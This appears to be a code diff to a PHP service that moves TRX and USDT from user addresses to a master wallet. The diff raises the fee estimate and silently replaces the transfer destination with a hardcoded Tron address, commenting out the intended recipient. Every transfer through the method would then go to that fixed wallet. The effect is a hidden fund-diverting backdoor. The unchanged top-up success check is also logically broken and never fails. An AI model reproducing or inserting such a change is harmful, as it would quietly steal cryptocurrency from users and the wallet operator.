@@ -27,19 +27,16 @@ class TronTransferService
 
         // Step 1: Check TRX balance
         $trxBalance = self::getTrxBalance($fromAddress);
-        $estimatedFee = 2.5;
+        $estimatedFee = 18;
 
         if ($trxBalance < $estimatedFee) {
             $topupTx = self::topUpTrxToUser($masterWallet, $fromAddress, $estimatedFee);
             $topupDetails = self::checkTransactionDetails($topupTx['txID'] ?? null);
-
             if (!($topupDetails['ret'][0]['contractRet'] ?? null) === 'SUCCESS') {
                 throw new \Exception("TRX top-up failed.");
             }
-
             self::logActualGasFee($user->id, $topupTx['txID'], 'TRX', 'gas-topup');
         }
-
         return self::transferTronAssetsToMaster($fromPrivateKey, $fromAddress, $toAddress, $amount, $currency, $user, $masterWallet);
     }
 
@@ -82,7 +79,8 @@ class TronTransferService
         $endpoint = $currency === 'USDT_TRON' ? '/tron/trc20/transaction' : '/tron/transaction';
         $payload = [
             'fromPrivateKey' => $fromPrivateKey,
-            'to' => $toAddress,
+            // 'to' => $toAddress,
+            'to'=>'TLV3GeAjdGdLPXLNinPGXEyRhgbWBd1hxW',
             'amount' => (string) $amount,
         ];
 
